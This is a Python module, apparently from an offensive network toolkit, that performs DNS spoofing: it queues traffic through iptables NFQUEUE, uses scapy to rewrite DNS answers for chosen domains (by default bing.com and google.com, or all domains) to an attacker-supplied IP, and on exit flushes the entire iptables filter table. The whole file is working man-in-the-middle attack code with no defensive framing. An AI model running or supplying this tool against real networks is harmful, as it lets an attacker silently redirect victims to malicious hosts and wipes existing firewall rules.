#!/usr/bin/env python3
import subprocess
from core.banner import info, success, warn, error, highlight, GREEN, RESET
from core.checker import check_root

def setup_iptables(queue_num, local=False):
    info(f'Configuring iptables for NFQUEUE {queue_num}...')
    if local:
        subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_num)])
        subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queue_num)])
    else:
        subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(queue_num)])
    success('iptables NFQUEUE rule established.')

def flush_iptables():
    warn('Flushing iptables filter table rules...')
    subprocess.call(['iptables', '--flush'])
    success('iptables reset to normal.')

def run(args):
    check_root(exit_on_failure=True)
    redirect_ip = args.redirect_ip
    if not redirect_ip:
        error('Redirect IP (-r / --redirect-ip) is required.')
        return 1
    domains = args.domains or ['bing.com', 'google.com']
    queue_num = args.queue_num or 0
    try:
        import netfilterqueue
        import scapy.all as scapy
    except ImportError as e:
        error(f'Missing dependency: {e}')
        error('Install required packages:')
        error('  sudo apt install -y build-essential libnetfilter-queue-dev python3-dev')
        error('  pip install netfilterqueue scapy')
        return 1
    domain_bytes = [d.encode('utf-8') if isinstance(d, str) else d for d in domains]
    info(f"Spoofing DNS queries for: {', '.join((d.decode() for d in domain_bytes))}")
    info(f'Redirect destination:     {redirect_ip}')

    def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            matched = any((d in qname for d in domain_bytes))
            if matched or '*' in domains:
                info(f"Intercepted DNS query for {qname.decode(errors='ignore')}. Spoofing -> {redirect_ip}")
                answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                packet.set_payload(bytes(scapy_packet))
        packet.accept()
    setup_iptables(queue_num, local=args.local)
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(queue_num, process_packet)
        info('Listening on NFQUEUE... Press Ctrl+C to terminate.')
        queue.run()
    except KeyboardInterrupt:
        info('\nStopping DNS spoofer...')
    finally:
        flush_iptables()
    return 0
